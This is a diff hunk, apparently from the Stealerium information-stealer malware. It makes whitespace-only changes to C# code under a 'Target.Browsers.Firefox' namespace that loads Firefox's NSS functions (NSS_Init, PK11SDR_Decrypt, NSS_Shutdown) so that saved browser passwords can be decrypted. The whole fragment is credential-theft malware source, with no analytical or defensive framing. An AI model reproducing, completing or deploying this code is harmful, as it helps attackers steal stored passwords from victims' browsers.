@@ -57,12 +57,12 @@ namespace Stealerium.Target.Browsers.Firefox
                 var ipNssPk11SdrDecrypt = WinApi.GetProcAddress(_hNss3, "PK11SDR_Decrypt");
                 var ipNssShutdown = WinApi.GetProcAddress(_hNss3, "NSS_Shutdown");
 
-                _fpNssInit = (Nss3.NssInit) Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
+                _fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
                 _fpPk11SdrDecrypt =
-                    (Nss3.Pk11SdrDecrypt) Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt,
+                    (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt,
                         typeof(Nss3.Pk11SdrDecrypt));
                 _fpNssShutdown =
-                    (Nss3.NssShutdown) Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));
+                    (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));
 
                 return true;
             }
